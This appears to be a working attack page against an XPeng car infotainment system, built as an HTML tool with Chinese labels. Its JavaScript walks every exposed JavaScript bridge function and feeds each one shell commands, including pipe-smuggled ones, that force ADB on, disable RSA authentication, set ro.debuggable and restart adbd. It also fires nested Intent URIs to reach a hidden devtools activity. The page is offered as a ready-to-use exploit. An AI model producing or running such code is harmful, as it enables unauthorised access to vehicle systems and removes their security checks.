<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>XPENG IRON-MAN v26</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 15px; }
        .box { border: 1px solid #333; background: #111; padding: 15px; margin-bottom: 15px; border-radius: 8px; }
        button { 
            width: 100%; padding: 18px; margin-bottom: 8px; border-radius: 5px; cursor: pointer;
            font-weight: bold; font-family: inherit; font-size: 13px; text-align: left;
        }
        .btn-pwn { background: #300; border: 1px solid #f00; color: #f00; border-left: 5px solid #f00; }
        .btn-pwn:active { background: #f00; color: #000; }
        .log { height: 200px; background: #000; overflow-y: scroll; font-size: 11px; padding: 10px; color: #888; border: 1px solid #222; }
        .c-ok { color: #0f0; }
        .c-err { color: #f00; }
    </style>
</head>
<body>

<div class="box">
    <h3 style="margin-top:0; color:#fff;">🛠 USB 物理层重写矩阵</h3>
    <p style="font-size:10px; color:#666;">目标：修改系统属性将 USB 口强制设为 ADB 模式。</p>
    
    <!-- 核心攻击按钮 -->
    <button class="btn-pwn" onclick="USB.forceAdb()">⚡️ 1. 强开物理 ADB (persist.sys.usb.config)</button>
    <button class="btn-pwn" onclick="USB.disableSecure()">🔓 2. 强关 RSA 鉴权 (ro.adb.secure=0)</button>
    <button class="btn-pwn" style="background:#020; border-color:#0f0; color:#0f0;" onclick="USB.restart()">🔄 3. 重启 adbd & 刷新配置</button>
</div>

<div class="box">
    <h3 style="margin-top:0; color:#fff;">🚀 终极跳转 (Reflected)</h3>
    <button onclick="USB.jump()">🏹 尝试穿透认证界面 (反射 Intent)</button>
</div>

<div class="log" id="log">Console ready...</div>

<script>
const Log = (m, type) => {
    const d = document.createElement('div');
    d.className = type || '';
    d.innerText = `[${new Date().toLocaleTimeString()}] ${m}`;
    const logBox = document.getElementById('log');
    logBox.insertBefore(d, logBox.firstChild);
};

const USB = {
    // 1. 物理层修改逻辑
    forceAdb: function() {
        Log("Injecting USB Config Overrides...", "c-ok");
        // 同时修改即时属性和持久化属性，包含 mtp,adb 兼容模式
        const payloads = [
            "settings put global adb_enabled 1",
            "setprop persist.sys.usb.config mtp,adb",
            "setprop sys.usb.config mtp,adb",
            "setprop persist.vendor.usb.config adb", // 针对部分车机 vendor 属性
            "setprop persist.sys.usb.state adb"
        ];
        this._batchInject(payloads);
    },

    // 2. 绕过授权弹窗 (关键：解决 adb devices 空白)
    disableSecure: function() {
        Log("Nuking RSA Security Check...", "c-err");
        const payloads = [
            "setprop ro.adb.secure 0", 
            "setprop ro.debuggable 1",
            "setprop persist.service.adb.enable 1"
        ];
        this._batchInject(payloads);
    },

    restart: function() {
        Log("Force restarting adbd service...", "c-ok");
        this._batchInject(["setprop ctl.restart adbd"]);
    },

    // 3. 反射 Intent
    jump: function() {
        const pkg = "com.xiaopeng.devtools";
        const cls = ".view.usersettings.UserSettingsActivity";
        const inner = encodeURIComponent(`intent:#Intent;component=${pkg}/${cls};flags=295282278;end`);
        // 使用多种参数名暴力尝试
        ["target","intent","nested","uri"].forEach(p => {
            const uri = `intent:#Intent;component=${pkg}/.MainActivity;S.${p}=${inner};end`;
            window.location.href = uri;
        });
    },

    _batchInject: function(cmds) {
        for(let p in window) {
            try {
                let o = window[p];
                if(typeof o === 'object' && o !== null) {
                    for(let k in o) {
                        if(typeof o[k] === 'function') {
                            cmds.forEach(c => {
                                // 尝试管道符混淆注入
                                try { o[k](`ro.product.model|${c}`); } catch(e){}
                                // 尝试直接注入
                                try { o[k](c); } catch(e){}
                            });
                        }
                    }
                }
            } catch(e){}
        }
    }
};
</script>
</body>
</html>
